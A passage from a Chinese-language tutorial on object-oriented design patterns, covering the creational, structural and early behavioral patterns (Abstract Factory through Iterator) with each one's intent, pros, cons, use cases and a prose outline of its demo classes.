Pattern）是围绕一个超级工厂创建其他工厂。该超级工厂又称为其他工厂的工厂。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。在抽象工厂模式中，接口是负责创建一个相关对象的工厂，不需要显式指定它们的类。每个生成的工厂都能按照工厂模式提供对象。\n介绍意图：提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。主要解决：主要解决接口选择的问题。何时使用：系统的产品有多于一个的产品族，而系统只消费其中某一族的产品。如何解决：在一个产品族里面，定义多个产品。关键代码：在一个工厂里聚合多个同类产品。应用实例：工作了，为了参加一些聚会，肯定有两套或多套衣服吧，比如说有商务装（成套，一系列具体产品）、时尚装（成套，一系列具体产品），甚至对于一个家庭来说，可能有商务女装、商务男装、时尚女装、时尚男装，这些也都是成套的，即一系列具体产品。假设一种情况（现实中是不存在的，要不然，没法进入共产主义了，但有利于说明抽象工厂模式），在您的家中，某一个衣柜（具体工厂）只能存放某一种这样的衣服（成套，一系列具体产品），每次拿这种成套的衣服时也自然要从这个衣柜中取出了。用 OO 的思想去理解，所有的衣柜（具体工厂）都是衣柜类的（抽象工厂）某一个，而每一件成套的衣服又包括具体的上衣（某一具体产品），裤子（某一具体产品），这些具体的上衣其实也都是上衣（抽象产品），具体的裤子也都是裤子（另一个抽象产品）。优点：当一个产品族中的多个对象被设计成一起工作时，它能保证客户端始终只使用同一个产品族中的对象。缺点：产品族扩展非常困难，要增加一个系列的某一产品，既要在抽象的 Creator 里加代码，又要在具体的里面加代码。使用场景： 1、QQ 换皮肤，一整套一起换。 2、生成不同操作系统的程序。注意事项：产品族难扩展，产品等级易扩展。\n实现我们将创建 Shape 和 Color 接口和实现这些接口的实体类。下一步是创建抽象工厂类 AbstractFactory。接着定义工厂类 ShapeFactory 和 ColorFactory，这两个工厂类都是扩展了 AbstractFactory。然后创建一个工厂创造器&#x2F;生成器类 FactoryProducer。AbstractFactoryPatternDemo，我们的演示类使用 FactoryProducer 来获取 AbstractFactory 对象。它将向 AbstractFactory 传递形状信息 Shape（CIRCLE &#x2F; RECTANGLE &#x2F; SQUARE），以便获取它所需对象的类型。同时它还向 AbstractFactory 传递颜色信息 Color（RED &#x2F; GREEN &#x2F; BLUE），以便获取它所需对象的类型。\n\n单例模式单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。注意：1、单例类只能有一个实例。2、单例类必须自己创建自己的唯一实例。3、单例类必须给所有其他对象提供这一实例。\n介绍意图：保证一个类仅有一个实例，并提供一个访问它的全局访问点。主要解决：一个全局使用的类频繁地创建与销毁。何时使用：当您想控制实例数目，节省系统资源的时候。如何解决：判断系统是否已经有这个单例，如果有则返回，如果没有则创建。关键代码：构造函数是私有的。应用实例： 1、一个党只能有一个主席。 2、Windows 是多进程多线程的，在操作一个文件的时候，就不可避免地出现多个进程或线程同时操作一个文件的现象，所以所有文件的处理必须通过唯一的实例来进行。 3、一些设备管理器常常设计为单例模式，比如一个电脑有两台打印机，在输出的时候就要处理不能两台打印机打印同一个文件。优点： 1、在内存里只有一个实例，减少了内存的开销，尤其是频繁的创建和销毁实例（比如管理学院首页页面缓存）。 2、避免对资源的多重占用（比如写文件操作）。缺点：没有接口，不能继承，与单一职责原则冲突，一个类应该只关心内部逻辑，而不关心外面怎么样来实例化。使用场景： 1、要求生产唯一序列号。 2、WEB 中的计数器，不用每次刷新都在数据库里加一次，用单例先缓存起来。 3、创建的一个对象需要消耗的资源过多，比如 I&#x2F;O 与数据库的连接等。注意事项：getInstance() 方法中需要使用同步锁 synchronized (Singleton.class) 防止多线程同时进入造成 instance 被多次实例化。\n实现我们将创建一个 SingleObject 类。SingleObject 类有它的私有构造函数和本身的一个静态实例。SingleObject 类提供了一个静态方法，供外界获取它的静态实例。SingletonPatternDemo，我们的演示类使用 SingleObject 类来获取 SingleObject 对象。\n\n建造者模式建造者模式（Builder Pattern）使用多个简单的对象一步一步构建成一个复杂的对象。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。一个 Builder 类会一步一步构造最终的对象。该 Builder 类是独立于其他对象的。\n介绍意图：将一个复杂的构建与其表示相分离，使得同样的构建过程可以创建不同的表示。主要解决：主要解决在软件系统中，有时候面临着”一个复杂对象”的创建工作，其通常由各个部分的子对象用一定的算法构成；由于需求的变化，这个复杂对象的各个部分经常面临着剧烈的变化，但是将它们组合在一起的算法却相对稳定。何时使用：一些基本部件不会变，而其组合经常变化的时候。如何解决：将变与不变分离开。关键代码：建造者：创建和提供实例，导演：管理建造出来的实例的依赖关系。应用实例： 1、去肯德基，汉堡、可乐、薯条、炸鸡翅等是不变的，而其组合是经常变化的，生成出所谓的”套餐”。 2、JAVA 中的 StringBuilder。优点： 1、建造者独立，易扩展。 2、便于控制细节风险。缺点： 1、产品必须有共同点，范围有限制。 2、如内部变化复杂，会有很多的建造类。使用场景： 1、需要生成的对象具有复杂的内部结构。 2、需要生成的对象内部属性本身相互依赖。注意事项：与工厂模式的区别是：建造者模式更加关注与零件装配的顺序。\n实现我们假设一个快餐店的商业案例，其中，一个典型的套餐可以是一个汉堡（Burger）和一杯冷饮（Cold drink）。汉堡（Burger）可以是素食汉堡（Veg Burger）或鸡肉汉堡（Chicken Burger），它们是包在纸盒中。冷饮（Cold drink）可以是可口可乐（coke）或百事可乐（pepsi），它们是装在瓶子中。我们将创建一个表示食物条目（比如汉堡和冷饮）的 Item 接口和实现 Item 接口的实体类，以及一个表示食物包装的 Packing 接口和实现 Packing 接口的实体类，汉堡是包在纸盒中，冷饮是装在瓶子中。然后我们创建一个 Meal 类，带有 Item 的 ArrayList 和一个通过结合 Item 来创建不同类型的 Meal 对象的 MealBuilder。BuilderPatternDemo，我们的演示类使用 MealBuilder 来创建一个 Meal。\n\n原型模式原型模式（Prototype Pattern）是用于创建重复的对象，同时又能保证性能。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。这种模式是实现了一个原型接口，该接口用于创建当前对象的克隆。当直接创建对象的代价比较大时，则采用这种模式。例如，一个对象需要在一个高代价的数据库操作之后被创建。我们可以缓存该对象，在下一个请求时返回它的克隆，在需要的时候更新数据库，以此来减少数据库调用。\n介绍意图：用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。主要解决：在运行期建立和删除原型。何时使用： 1、当一个系统应该独立于它的产品创建，构成和表示时。 2、当要实例化的类是在运行时刻指定时，例如，通过动态装载。 3、为了避免创建一个与产品类层次平行的工厂类层次时。 4、当一个类的实例只能有几个不同状态组合中的一种时。建立相应数目的原型并克隆它们可能比每次用合适的状态手工实例化该类更方便一些。如何解决：利用已有的一个原型对象，快速地生成和原型对象一样的实例。关键代码： 1、实现克隆操作，在 JAVA 继承 Cloneable，重写 clone()，在 .NET 中可以使用 Object 类的 MemberwiseClone() 方法来实现对象的浅拷贝或通过序列化的方式来实现深拷贝。 2、原型模式同样用于隔离类对象的使用者和具体类型（易变类）之间的耦合关系，它同样要求这些”易变类”拥有稳定的接口。应用实例： 1、细胞分裂。 2、JAVA 中的 Object clone() 方法。优点： 1、性能提高。 2、逃避构造函数的约束。缺点： 1、配备克隆方法需要对类的功能进行通盘考虑，这对于全新的类不是很难，但对于已有的类不一定很容易，特别当一个类引用不支持串行化的间接对象，或者引用含有循环结构的时候。 2、必须实现 Cloneable 接口。 3、逃避构造函数的约束。使用场景： 1、资源优化场景。 2、类初始化需要消化非常多的资源，这个资源包括数据、硬件资源等。 3、性能和安全要求的场景。 4、通过 new 产生一个对象需要非常繁琐的数据准备或访问权限，则可以使用原型模式。 5、一个对象多个修改者的场景。 6、一个对象需要提供给其他对象访问，而且各个调用者可能都需要修改其值时，可以考虑使用原型模式拷贝多个对象供调用者使用。 7、在实际项目中，原型模式很少单独出现，一般是和工厂方法模式一起出现，通过 clone 的方法创建一个对象，然后由工厂方法提供给调用者。原型模式已经与 Java 融为浑然一体，大家可以随手拿来使用。注意事项：与通过对一个类进行实例化来构造新对象不同的是，原型模式是通过拷贝一个现有对象生成新对象的。浅拷贝实现 Cloneable，重写，深拷贝是通过实现 Serializable 读取二进制流。\n实现我们将创建一个抽象类 Shape 和扩展了 Shape 类的实体类。下一步是定义类 ShapeCache，该类把 shape 对象存储在一个 Hashtable 中，并在请求的时候返回它们的克隆。PrototypPatternDemo，我们的演示类使用 ShapeCache 类来获取 Shape 对象。\n\n结构型模式（8种）这些设计模式关注类和对象的组合。继承的概念被用来组合接口和定义组合对象获得新功能的方式。\n\n适配器模式（Adapter Pattern）\n桥接模式（Bridge Pattern）\n过滤器模式（Filter、Criteria Pattern）\n组合模式（Composite Pattern）\n装饰器模式（Decorator Pattern）\n外观模式（Facade Pattern）\n享元模式（Flyweight Pattern）\n代理模式（Proxy Pattern）\n\n适配器模式适配器模式（Adapter Pattern）是作为两个不兼容的接口之间的桥梁。这种类型的设计模式属于结构型模式，它结合了两个独立接口的功能。这种模式涉及到一个单一的类，该类负责加入独立的或不兼容的接口功能。举个真实的例子，读卡器是作为内存卡和笔记本之间的适配器。您将内存卡插入读卡器，再将读卡器插入笔记本，这样就可以通过笔记本来读取内存卡。我们通过下面的实例来演示适配器模式的使用。其中，音频播放器设备只能播放 mp3 文件，通过使用一个更高级的音频播放器来播放 vlc 和 mp4 文件。\n介绍意图：将一个类的接口转换成客户希望的另外一个接口。适配器模式使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。主要解决：主要解决在软件系统中，常常要将一些”现存的对象”放到新的环境中，而新环境要求的接口是现对象不能满足的。何时使用： 1、系统需要使用现有的类，而此类的接口不符合系统的需要。 2、想要建立一个可以重复使用的类，用于与一些彼此之间没有太大关联的一些类，包括一些可能在将来引进的类一起工作，这些源类不一定有一致的接口。 3、通过接口转换，将一个类插入另一个类系中。（比如老虎和飞禽，现在多了一个飞虎，在不增加实体的需求下，增加一个适配器，在里面包容一个虎对象，实现飞的接口。）如何解决：继承或依赖（推荐）。关键代码：适配器继承或依赖已有的对象，实现想要的目标接口。应用实例： 1、美国电器 110V，中国 220V，就要有一个适配器将 110V 转化为 220V。 2、JAVA JDK 1.1 提供了 Enumeration 接口，而在 1.2 中提供了 Iterator 接口，想要使用 1.2 的 JDK，则要将以前系统的 Enumeration 接口转化为 Iterator 接口，这时就需要适配器模式。 3、在 LINUX 上运行 WINDOWS 程序。 4、JAVA 中的 jdbc。优点： 1、可以让任何两个没有关联的类一起运行。 2、提高了类的复用。 3、增加了类的透明度。 4、灵活性好。缺点： 1、过多地使用适配器，会让系统非常零乱，不易整体进行把握。比如，明明看到调用的是 A 接口，其实内部被适配成了 B 接口的实现，一个系统如果太多出现这种情况，无异于一场灾难。因此如果不是很有必要，可以不使用适配器，而是直接对系统进行重构。 2.由于 JAVA 至多继承一个类，所以至多只能适配一个适配者类，而且目标类必须是抽象类。使用场景：有动机地修改一个正常运行的系统的接口，这时应该考虑使用适配器模式。注意事项：适配器不是在详细设计时添加的，而是解决正在服役的项目的问题。\n实现我们有一个 MediaPlayer 接口和一个实现了 MediaPlayer 接口的实体类 AudioPlayer。默认情况下，AudioPlayer 可以播放 mp3 格式的音频文件。我们还有另一个接口 AdvancedMediaPlayer 和实现了 AdvancedMediaPlayer 接口的实体类。该类可以播放 vlc 和 mp4 格式的文件。我们想要让 AudioPlayer 播放其他格式的音频文件。为了实现这个功能，我们需要创建一个实现了 MediaPlayer 接口的适配器类 MediaAdapter，并使用 AdvancedMediaPlayer 对象来播放所需的格式。AudioPlayer 使用适配器类 MediaAdapter 传递所需的音频类型，不需要知道能播放所需格式音频的实际类。AdapterPatternDemo，我们的演示类使用 AudioPlayer 类来播放各种格式。\n\n桥接模式桥接（Bridge）是用于把抽象化与实现化解耦，使得二者可以独立变化。这种类型的设计模式属于结构型模式，它通过提供抽象化和实现化之间的桥接结构，来实现二者的解耦。这种模式涉及到一个作为桥接的接口，使得实体类的功能独立于接口实现类。这两种类型的类可被结构化改变而互不影响。我们通过下面的实例来演示桥接模式（Bridge Pattern）的用法。其中，可以使用相同的抽象类方法但是不同的桥接实现类，来画出不同颜色的圆。\n介绍意图：将抽象部分与实现部分分离，使它们都可以独立的变化。主要解决：在有多种可能会变化的情况下，用继承会造成类爆炸问题，扩展起来不灵活。何时使用：实现系统可能有多个角度分类，每一种角度都可能变化。如何解决：把这种多角度分类分离出来，让它们独立变化，减少它们之间耦合。关键代码：抽象类依赖实现类。应用实例： 1、猪八戒从天蓬元帅转世投胎到猪，转世投胎的机制将尘世划分为两个等级，即：灵魂和肉体，前者相当于抽象化，后者相当于实现化。生灵通过功能的委派，调用肉体对象的功能，使得生灵可以动态地选择。 2、墙上的开关，可以看到的开关是抽象的，不用管里面具体怎么实现的。优点： 1、抽象和实现的分离。 2、优秀的扩展能力。 3、实现细节对客户透明。缺点：桥接模式的引入会增加系统的理解与设计难度，由于聚合关联关系建立在抽象层，要求开发者针对抽象进行设计与编程。使用场景： 1、如果一个系统需要在构件的抽象化角色和具体化角色之间增加更多的灵活性，避免在两个层次之间建立静态的继承联系，通过桥接模式可以使它们在抽象层建立一个关联关系。 2、对于那些不希望使用继承或因为多层次继承导致系统类的个数急剧增加的系统，桥接模式尤为适用。 3、一个类存在两个独立变化的维度，且这两个维度都需要进行扩展。注意事项：对于两个独立变化的维度，使用桥接模式再适合不过了。\n实现我们有一个作为桥接实现的 DrawAPI 接口和实现了 DrawAPI 接口的实体类 RedCircle、GreenCircle。Shape 是一个抽象类，将使用 DrawAPI 的对象。BridgePatternDemo，我们的演示类使用 Shape 类来画出不同颜色的圆。\n\n过滤器模式过滤器模式（Filter Pattern）或标准模式（Criteria Pattern）是一种设计模式，这种模式允许开发人员使用不同的标准来过滤一组对象，通过逻辑运算以解耦的方式把它们连接起来。这种类型的设计模式属于结构型模式，它结合多个标准来获得单一标准。\n实现我们将创建一个 Person 对象、Criteria 接口和实现了该接口的实体类，来过滤 Person 对象的列表。CriteriaPatternDemo，我们的演示类使用 Criteria 对象，基于各种标准和它们的结合来过滤 Person 对象的列表。\n\n组合模式组合模式（Composite Pattern），又叫部分整体模式，是用于把一组相似的对象当作一个单一的对象。组合模式依据树形结构来组合对象，用来表示部分以及整体层次。这种类型的设计模式属于结构型模式，它创建了对象组的树形结构。这种模式创建了一个包含自己对象组的类。该类提供了修改相同对象组的方式。我们通过下面的实例来演示组合模式的用法。实例演示了一个组织中员工的层次结构。\n介绍意图：将对象组合成树形结构以表示”部分-整体”的层次结构。组合模式使得用户对单个对象和组合对象的使用具有一致性。主要解决：它在我们树型结构的问题中，模糊了简单元素和复杂元素的概念，客户程序可以向处理简单元素一样来处理复杂元素，从而使得客户程序与复杂元素的内部结构解耦。何时使用： 1、您想表示对象的部分-整体层次结构（树形结构）。 2、您希望用户忽略组合对象与单个对象的不同，用户将统一地使用组合结构中的所有对象。如何解决：树枝和叶子实现统一接口，树枝内部组合该接口。关键代码：树枝内部组合该接口，并且含有内部属性 List，里面放 Component。应用实例： 1、算术表达式包括操作数、操作符和另一个操作数，其中，另一个操作符也可以是操作树、操作符和另一个操作数。 2、在 JAVA AWT 和 SWING 中，对于 Button 和 Checkbox 是树叶，Container 是树枝。优点： 1、高层模块调用简单。 2、节点自由增加。缺点：在使用组合模式时，其叶子和树枝的声明都是实现类，而不是接口，违反了依赖倒置原则。使用场景：部分、整体场景，如树形菜单，文件、文件夹的管理。注意事项：定义时为具体类。\n实现我们有一个类 Employee，该类被当作组合模型类。CompositePatternDemo，我们的演示类使用 Employee 类来添加部门层次结构，并打印所有员工。\n\n装饰器模式装饰器模式（Decorator Pattern）允许向一个现有的对象添加新的功能，同时又不改变其结构。这种类型的设计模式属于结构型模式，它是作为现有的类的一个包装。这种模式创建了一个装饰类，用来包装原有的类，并在保持类方法签名完整性的前提下，提供了额外的功能。我们通过下面的实例来演示装饰器模式的用法。其中，我们将把一个形状装饰上不同的颜色，同时又不改变形状类。\n介绍意图：动态地给一个对象添加一些额外的职责。就增加功能来说，装饰器模式相比生成子类更为灵活。主要解决：一般的，我们为了扩展一个类经常使用继承方式实现，由于继承为类引入静态特征，并且随着扩展功能的增多，子类会很膨胀。何时使用：在不想增加很多子类的情况下扩展类。如何解决：将具体功能职责划分，同时继承装饰者模式。关键代码： 1、Component 类充当抽象角色，不应该具体实现。 2、修饰类引用和继承 Component 类，具体扩展类重写父类方法。应用实例： 1、孙悟空有 72 变，当他变成”庙宇”后，他的根本还是一只猴子，但是他又有了庙宇的功能。 2、不论一幅画有没有画框都可以挂在墙上，但是通常都是有画框的，并且实际上是画框被挂在墙上。在挂在墙上之前，画可以被蒙上玻璃，装到框子里；这时画、玻璃和画框形成了一个物体。优点：装饰类和被装饰类可以独立发展，不会相互耦合，装饰模式是继承的一个替代模式，装饰模式可以动态扩展一个实现类的功能。缺点：多层装饰比较复杂。使用场景： 1、扩展一个类的功能。 2、动态增加功能，动态撤销。注意事项：可代替继承。\n实现我们将创建一个 Shape 接口和实现了 Shape 接口的实体类。然后我们创建一个实现了 Shape 接口的抽象装饰类 ShapeDecorator，并把 Shape 对象作为它的实例变量。RedShapeDecorator 是实现了 ShapeDecorator 的实体类。DecoratorPatternDemo，我们的演示类使用 RedShapeDecorator 来装饰 Shape 对象。\n\n外观模式外观模式（Facade Pattern）隐藏系统的复杂性，并向客户端提供了一个客户端可以访问系统的接口。这种类型的设计模式属于结构型模式，它向现有的系统添加一个接口，来隐藏系统的复杂性。这种模式涉及到一个单一的类，该类提供了客户端请求的简化方法和对现有系统类方法的委托调用。\n介绍意图：为子系统中的一组接口提供一个一致的界面，外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。主要解决：降低访问复杂系统的内部子系统时的复杂度，简化客户端与之的接口。何时使用： 1、客户端不需要知道系统内部的复杂联系，整个系统只需提供一个”接待员”即可。 2、定义系统的入口。如何解决：客户端不与系统耦合，外观类与系统耦合。关键代码：在客户端和复杂系统之间再加一层，这一次将调用顺序、依赖关系等处理好。应用实例： 1、去医院看病，可能要去挂号、门诊、划价、取药，让患者或患者家属觉得很复杂，如果有提供接待人员，只让接待人员来处理，就很方便。 2、JAVA 的三层开发模式。优点： 1、减少系统相互依赖。 2、提高灵活性。 3、提高了安全性。缺点：不符合开闭原则，如果要改东西很麻烦，继承重写都不合适。使用场景： 1、为复杂的模块或子系统提供外界访问的模块。 2、子系统相对独立。 3、预防低水平人员带来的风险。注意事项：在层次化结构中，可以使用外观模式定义系统中每一层的入口。\n实现我们将创建一个 Shape 接口和实现了 Shape 接口的实体类。下一步是定义一个外观类 ShapeMaker。ShapeMaker 类使用实体类来代表用户对这些类的调用。FacadePatternDemo，我们的演示类使用 ShapeMaker 类来显示结果。\n\n享元模式享元模式（Flyweight Pattern）主要用于减少创建对象的数量，以减少内存占用和提高性能。这种类型的设计模式属于结构型模式，它提供了减少对象数量从而改善应用所需的对象结构的方式。享元模式尝试重用现有的同类对象，如果未找到匹配的对象，则创建新对象。我们将通过创建 5 个对象来画出 20 个分布于不同位置的圆来演示这种模式。由于只有 5 种可用的颜色，所以 color 属性被用来检查现有的 Circle 对象。\n介绍意图：运用共享技术有效地支持大量细粒度的对象。主要解决：在有大量对象时，有可能会造成内存溢出，我们把其中共同的部分抽象出来，如果有相同的业务请求，直接返回在内存中已有的对象，避免重新创建。何时使用： 1、系统中有大量对象。 2、这些对象消耗大量内存。 3、这些对象的状态大部分可以外部化。 4、这些对象可以按照内蕴状态分为很多组，当把外蕴对象从对象中剔除出来时，每一组对象都可以用一个对象来代替。 5、系统不依赖于这些对象身份，这些对象是不可分辨的。如何解决：用唯一标识码判断，如果在内存中有，则返回这个唯一标识码所标识的对象。关键代码：用 HashMap 存储这些对象。应用实例： 1、JAVA 中的 String，如果有则返回，如果没有则创建一个字符串保存在字符串缓存池里面。 2、数据库的数据池。优点：大大减少对象的创建，降低系统的内存，使效率提高。缺点：提高了系统的负责度，需要分离出外部状态和内部状态，而且外部状态具有固有化的性质，不应该随着内部状态的变化而变化，否则会造成系统的混乱。使用场景： 1、系统有大量相似对象。 2、需要缓冲池的场景。注意事项： 1、注意划分外部状态和内部状态，否则可能会引起线程安全问题。 2、这些类必须有一个工厂对象加以控制。\n实现我们将创建一个 Shape 接口和实现了 Shape 接口的实体类 Circle。下一步是定义工厂类 ShapeFactory。ShapeFactory 有一个 Circle 的 HashMap，其中键名为 Circle 对象的颜色。无论何时接收到请求，都会创建一个特定颜色的圆。ShapeFactory 检查它的 HashMap 中的 circle 对象，如果找到 Circle 对象，则返回该对象，否则将创建一个存储在 hashmap 中以备后续使用的新对象，并把该对象返回到客户端。FlyWeightPatternDemo，我们的演示类使用 ShapeFactory 来获取 Shape 对象。它将向 ShapeFactory 传递信息（red &#x2F; green &#x2F; blue&#x2F; black &#x2F; white），以便获取它所需对象的颜色。\n\n代理模式在代理模式（Proxy Pattern）中，一个类代表另一个类的功能。这种类型的设计模式属于结构型模式。在代理模式中，我们创建具有现有对象的对象，以便向外界提供功能接口。\n介绍意图：为其他对象提供一种代理以控制对这个对象的访问。主要解决：在直接访问对象时带来的问题，比如说：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。何时使用：想在访问一个类时做一些控制。如何解决：增加中间层。关键代码：实现与被代理类组合。应用实例： 1、Windows 里面的快捷方式。 2、猪八戒去找高翠兰结果是孙悟空变的，可以这样理解：把高翠兰的外貌抽象出来，高翠兰本人和孙悟空都实现了这个接口，猪八戒访问高翠兰的时候看不出来这个是孙悟空，所以说孙悟空是高翠兰代理类。 3、买火车票不一定在火车站买，也可以去代售点。 4、一张支票或银行存单是账户中资金的代理。支票在市场交易中用来代替现金，并提供对签发人账号上资金的控制。 5、spring aop。优点： 1、职责清晰。 2、高扩展性。 3、智能化。缺点： 1、由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢。 2、实现代理模式需要额外的工作，有些代理模式的实现非常复杂。使用场景：按职责来划分，通常有以下使用场景： 1、远程代理。 2、虚拟代理。 3、Copy-on-Write 代理。 4、保护（Protect or Access）代理。 5、Cache代理。 6、防火墙（Firewall）代理。 7、同步化（Synchronization）代理。 8、智能引用（Smart Reference）代理。注意事项： 1、和适配器模式的区别：适配器模式主要改变所考虑对象的接口，而代理模式不能改变所代理类的接口。 2、和装饰器模式的区别：装饰器模式为了增强功能，而代理模式是为了加以控制。\n实现我们将创建一个 Image 接口和实现了 Image 接口的实体类。ProxyImage 是一个代理类，减少 RealImage 对象加载的内存占用。ProxyPatternDemo，我们的演示类使用 ProxyImage 来获取要加载的 Image 对象，并按照需求进行显示。\n\n行为型模式（12种）这些设计模式特别关注对象之间的通信。\n\n责任链模式（Chain of Responsibility Pattern）\n命令模式（Command Pattern）\n解释器模式（Interpreter Pattern）\n迭代器模式（Iterator Pattern）\n中介者模式（Mediator Pattern）\n备忘录模式（Memento Pattern）\n观察者模式（Observer Pattern）\n状态模式（State Pattern）\n空对象模式（Null Object Pattern）\n策略模式（Strategy Pattern）\n模板模式（Template Pattern）\n访问者模式（Visitor Pattern）\n\n责任链模式顾名思义，责任链模式（Chain of Responsibility Pattern）为请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。这种类型的设计模式属于行为型模式。在这种模式中，通常每个接收者都包含对另一个接收者的引用。如果一个对象不能处理该请求，那么它会把相同的请求传给下一个接收者，依此类推。\n介绍意图：避免请求发送者与接收者耦合在一起，让多个对象都有可能接收请求，将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。主要解决：职责链上的处理者负责处理请求，客户只需要将请求发送到职责链上即可，无须关心请求的处理细节和请求的传递，所以职责链将请求的发送者和请求的处理者解耦了。何时使用：在处理消息的时候以过滤很多道。如何解决：拦截的类都实现统一接口。关键代码：Handler 里面聚合它自己，在 HanleRequest 里判断是否合适，如果没达到条件则向下传递，向谁传递之前 set 进去。应用实例： 1、红楼梦中的”击鼓传花”。 2、JS 中的事件冒泡。 3、JAVA WEB 中 Apache Tomcat 对 Encoding 的处理，Struts2 的拦截器，jsp servlet 的 Filter。优点： 1、降低耦合度。它将请求的发送者和接收者解耦。 2、简化了对象。使得对象不需要知道链的结构。 3、增强给对象指派职责的灵活性。通过改变链内的成员或者调动它们的次序，允许动态地新增或者删除责任。 4、增加新的请求处理类很方便。缺点： 1、不能保证请求一定被接收。 2、系统性能将受到一定影响，而且在进行代码调试时不太方便，可能会造成循环调用。 3、可能不容易观察运行时的特征，有碍于除错。使用场景： 1、有多个对象可以处理同一个请求，具体哪个对象处理该请求由运行时刻自动确定。 2、在不明确指定接收者的情况下，向多个对象中的一个提交一个请求。 3、可动态指定一组对象处理请求。注意事项：在 JAVA WEB 中遇到很多应用。\n实现我们创建抽象类 AbstractLogger，带有详细的日志记录级别。然后我们创建三种类型的记录器，都扩展了 AbstractLogger。每个记录器消息的级别是否属于自己的级别，如果是则相应地打印出来，否则将不打印并把消息传给下一个记录器。\n\n命令模式命令模式（Command Pattern）是一种数据驱动的设计模式，它属于行为型模式。请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。\n介绍意图：将一个请求封装成一个对象，从而使您可以用不同的请求对客户进行参数化。主要解决：在软件系统中，行为请求者与行为实现者通常是一种紧耦合的关系，但某些场合，比如需要对行为进行记录、撤销或重做、事务等处理时，这种无法抵御变化的紧耦合的设计就不太合适。何时使用：在某些场合，比如要对行为进行”记录、撤销&#x2F;重做、事务”等处理，这种无法抵御变化的紧耦合是不合适的。在这种情况下，如何将”行为请求者”与”行为实现者”解耦？将一组行为抽象为对象，可以实现二者之间的松耦合。如何解决：通过调用者调用接受者执行命令，顺序：调用者→接受者→命令。关键代码：定义三个角色：1、received 真正的命令执行对象 2、Command 3、invoker 使用命令对象的入口应用实例：struts 1 中的 action 核心控制器 ActionServlet 只有一个，相当于 Invoker，而模型层的类会随着不同的应用有不同的模型类，相当于具体的 Command。优点： 1、降低了系统耦合度。 2、新的命令可以很容易添加到系统中去。缺点：使用命令模式可能会导致某些系统有过多的具体命令类。使用场景：认为是命令的地方都可以使用命令模式，比如： 1、GUI 中每一个按钮都是一条命令。 2、模拟 CMD。注意事项：系统需要支持命令的撤销(Undo)操作和恢复(Redo)操作，也可以考虑使用命令模式，见命令模式的扩展。\n实现我们首先创建作为命令的接口 Order，然后创建作为请求的 Stock 类。实体命令类 BuyStock 和 SellStock，实现了 Order 接口，将执行实际的命令处理。创建作为调用对象的类 Broker，它接受订单并能下订单。Broker 对象使用命令模式，基于命令的类型确定哪个对象执行哪个命令。CommandPatternDemo，我们的演示类使用 Broker 类来演示命令模式。\n\n解释器模式解释器模式（Interpreter Pattern）提供了评估语言的语法或表达式的方式，它属于行为型模式。这种模式实现了一个表达式接口，该接口解释一个特定的上下文。这种模式被用在 SQL 解析、符号处理引擎等。\n介绍意图：给定一个语言，定义它的文法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子。主要解决：对于一些固定文法构建一个解释句子的解释器。何时使用：如果一种特定类型的问题发生的频率足够高，那么可能就值得将该问题的各个实例表述为一个简单语言中的句子。这样就可以构建一个解释器，该解释器通过解释这些句子来解决该问题。如何解决：构件语法树，定义终结符与非终结符。关键代码：构件环境类，包含解释器之外的一些全局信息，一般是 HashMap。应用实例：编译器、运算表达式计算。优点： 1、可扩展性比较好，灵活。 2、增加了新的解释表达式的方式。 3、易于实现简单文法。缺点： 1、可利用场景比较少。 2、对于复杂的文法比较难维护。 3、解释器模式会引起类膨胀。 4、解释器模式采用递归调用方法。使用场景： 1、可以将一个需要解释执行的语言中的句子表示为一个抽象语法树。 2、一些重复出现的问题可以用一种简单的语言来进行表达。 3、一个简单语法需要解释的场景。注意事项：可利用场景比较少，JAVA 中如果碰到可以用 expression4J 代替。\n实现我们将创建一个接口 Expression 和实现了 Expression 接口的实体类。定义作为上下文中主要解释器的 TerminalExpression 类。其他的类 OrExpression、AndExpression 用于创建组合式表达式。InterpreterPatternDemo，我们的演示类使用 Expression 类创建规则和演示表达式的解析。\n\n迭代器模式迭代器模式（Iterator Pattern）是 Java 和 .Net 编程环境中非常常用的设计模式。这种模式用于顺序访问集合对象的元素，不需要知道集合对象的底层表示。迭代器模式属于行为型模式。\n介绍意图：提供一种方法顺序访问一个聚合对象中各个元素, 而又无须暴露该对象的内部表示。主要解决：不同的方式来遍历整个整合对象。何时使用：遍历一个聚合对象。如何解决：把在元素之间游走的责任交给迭代器，而不是聚合对象。关键代码：定义接口：hasNext, next。应用实例：JAVA 中的 iterator。优点： 1、它支持以不同的方式遍历一个聚合对象。 2、迭代器简化了聚合类。 3、在同一个聚合上可以有多个遍历。 4、在迭代器模式中，增加新的聚合类和迭代器类都很方便，无须修改原有代码。缺点：由于迭代器模式将存储数据和遍历数据的职责分离，增加新的聚合类需要对应增加新的迭代器类，类的个数成对增加，这在一定程度上增加了系统的复杂性。使用场景： 1、访问一个聚合对象的内容而无须暴露它的内部表示。 2、需要为聚合对象提供多种遍历方式。 3、为遍历不同的聚合结构提供一个统一的接口。注意事项：迭代器模式就是分离了集合对象的遍历行为，抽象出一个迭代器类来负责，这样既可以做到不暴露集合的内部结构，又可让外部代码透明地访问集合内部的数据。\n实现我们将创建一个叙述导航方法的 Iterator 接口和一个返回迭代器的 Container 接口。实现了 Container 接口的实体类将负责实现 Iterator 接口。IteratorPatternDemo，我们的演示类使用实体类 NamesRepository 来打印 NamesRepository 中存储为集合的 